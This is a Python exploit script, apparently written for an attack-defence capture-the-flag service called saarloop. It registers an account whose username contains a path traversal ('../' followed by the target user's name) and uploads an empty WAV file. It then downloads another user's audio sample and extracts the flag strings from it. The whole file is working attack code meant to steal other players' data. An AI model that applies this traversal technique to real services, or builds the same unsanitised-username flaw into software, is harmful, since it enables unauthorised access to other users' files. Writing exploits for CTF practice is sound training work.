import io
import random
import re
import string
import wave

from saarloop_api import SaarloopAPI


def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def parse_flags_bytes(content):
    return [x.decode() for x in re.findall(rb'SAAR{[0-9A-Za-z_-]{32}}', content)]


def _exploit_sample(target, flag_id):
    target_username = flag_id.split(':', maxsplit=1)[0]
    target_sample = flag_id.rsplit('/', maxsplit=1)[1]

    username = f'{random_str(8)}/../{target_username}'
    password = random_str(8)

    api = SaarloopAPI(f'http://{target}:11025')
    api.register(username, password)

    empty_wave = io.BytesIO()
    with wave.open(empty_wave, 'wb') as f:
        f.setnchannels(1)
        f.setsampwidth(1)
        f.setframerate(11025)
        f.writeframes(b'')
    empty_wave.seek(0)

    api.upload_sample('empty', empty_wave)

    return parse_flags_bytes(api.download_sample(target_sample))


def exploit(target, *flag_ids_args):
    for sample_flag_ids in flag_ids_args:
        for flag_id in sample_flag_ids:
            if 'sample' in flag_id:
                try:
                    print(f'Attempting to leak flag for {flag_id=}')
                    for flag in _exploit_sample(target, flag_id):
                        print(flag)
                except:
                    pass


if __name__ == '__main__':
    import sys

    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', *[x.split(',') for x in sys.argv[2:]])
